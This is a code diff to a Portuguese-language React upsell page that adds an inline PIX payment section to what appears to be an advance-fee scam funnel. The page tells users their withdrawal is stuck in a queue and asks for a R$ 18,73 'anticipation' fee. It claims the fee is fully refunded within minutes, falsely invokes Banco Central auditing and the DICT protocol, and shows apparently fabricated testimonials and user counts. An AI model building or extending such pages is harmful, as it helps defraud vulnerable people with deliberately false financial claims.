@@ -1,16 +1,19 @@
 import { useState } from "react";
 import { Loader2, Check, ChevronDown, ChevronUp, Clock } from "lucide-react";
 import StickyCtaBar from "./StickyCtaBar";
+import InlinePixSection from "./InlinePixSection";
 import testimonial1 from "@/assets/testimonial-1.jpg";
 import testimonial2 from "@/assets/testimonial-2.jpg";
 import testimonial3 from "@/assets/testimonial-3.jpg";
+import { PixPaymentData } from "./types";
 
-interface FunnelUpsellSaqueImediatoProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; }
+interface FunnelUpsellSaqueImediatoProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; pixData?: PixPaymentData | null; onCopyPix?: () => void; isPixCopied?: boolean; onManualCheck?: () => void; isCheckingPayment?: boolean; checkError?: string | null; }
 const FaqItem = ({ question, answer }: { question: string; answer: string }) => { const [open, setOpen] = useState(false); return (<div className="bg-white rounded-lg border border-gray-100 overflow-hidden"><button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between p-3 text-left"><span className="text-gray-800 text-xs font-semibold pr-2">{question}</span>{open ? <ChevronUp className="w-4 h-4 text-gray-400 shrink-0" /> : <ChevronDown className="w-4 h-4 text-gray-400 shrink-0" />}</button>{open && <div className="px-3 pb-3 pt-0"><p className="text-gray-500 text-[11px] leading-relaxed">{answer}</p></div>}</div>); };
 const TestimonialCard = ({ img, name, location, text, time }: { img: string; name: string; location: string; text: string; time: string }) => (<div className="bg-white rounded-lg p-3 border border-gray-100"><div className="flex items-center gap-2 mb-2"><img src={img} alt={name} loading="lazy" className="w-8 h-8 rounded-full object-cover" /><div><p className="text-gray-800 text-xs font-semibold">{name}</p><p className="text-gray-400 text-[10px]">{location}</p></div><span className="ml-auto text-green-600 text-[10px] font-bold flex items-center gap-1"><Clock className="w-3 h-3" /> {time}</span></div><p className="text-gray-500 text-[11px] leading-relaxed">"{text}"</p></div>);
 
-const FunnelUpsellSaqueImediato = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellSaqueImediatoProps) => {
+const FunnelUpsellSaqueImediato = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName, pixData, onCopyPix, isPixCopied, onManualCheck, isCheckingPayment, checkError }: FunnelUpsellSaqueImediatoProps) => {
   const firstName = leadName ? leadName.split(" ")[0] : "";
+  const showPixInline = !!pixData?.pix_code;
   return (
     <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto pt-6">
       <div className="bg-[#FF6F00] py-3 px-4"><h1 className="text-white text-sm font-bold text-center tracking-wide flex items-center justify-center gap-2">{firstName ? `⏳ ${firstName.toUpperCase()}, SEU SAQUE ESTÁ NA FILA` : "⏳ SEU SAQUE ESTÁ NA FILA — POSIÇÃO 847"}</h1></div>
@@ -28,11 +31,16 @@ const FunnelUpsellSaqueImediato = ({ balance, onGeneratePix, isGenerating, leadC
           <p className="text-gray-400 text-[10px] text-center mt-2">🔒 Pagamento seguro via PIX • Reembolso garantido</p>
           <p className="text-gray-500 text-[11px] text-center leading-relaxed mt-3"><span className="font-bold text-gray-700">18.734 pessoas</span> anteciparam o saque e receberam em menos de 2 minutos.</p>
         </div>
+
+        {showPixInline && pixData && (
+          <InlinePixSection pixData={pixData} amount="R$ 18,73" label="Saque Imediato" onCopy={onCopyPix} isCopied={isPixCopied} onManualCheck={onManualCheck} isCheckingPayment={isCheckingPayment} checkError={checkError} accentColor="#FF6F00" />
+        )}
+
         <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Perguntas frequentes</p><div className="space-y-2"><FaqItem question="Por que meu saque demora 5-7 dias?" answer="Todos os saques passam por uma fila de processamento do sistema bancário. A antecipação coloca seu saque na fila prioritária." /><FaqItem question="A taxa de R$ 18,73 é reembolsável?" answer="Sim, 100%. A taxa é devolvida automaticamente junto com seu saldo em até 2 minutos." /><FaqItem question="É seguro? Vou receber mesmo?" answer="Totalmente seguro. A antecipação utiliza o mesmo protocolo DICT do Banco Central." /></div></div>
         <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Quem antecipou, recebeu na hora</p><div className="space-y-2"><TestimonialCard img={testimonial1} name="Amanda C." location="Rio de Janeiro, RJ" text="Ia esperar 7 dias, mas paguei a antecipação e em 1 minuto já tinha caído." time="1 min 23s" /><TestimonialCard img={testimonial2} name="Lucas P." location="Brasília, DF" text="Meu primo esperou a fila padrão e demorou 6 dias. Eu antecipei e recebi na hora." time="47s" /><TestimonialCard img={testimonial3} name="Patrícia F." location="Manaus, AM" text="Estava precisando do dinheiro urgente. Antecipei e caiu em menos de 2 minutos." time="1 min 58s" /></div></div>
         <div className="text-center pb-6"><p className="text-gray-400 text-[10px]">Sistema de antecipação auditado pelo Banco Central</p></div>
       </main>
-      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label={"RECEBER " + balance + " AGORA"} bgColor="bg-[#FF6F00]" shadowColor="shadow-orange-200" />
+      {!showPixInline && <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label={"RECEBER " + balance + " AGORA"} bgColor="bg-[#FF6F00]" shadowColor="shadow-orange-200" />}
     </div>
   );
 };
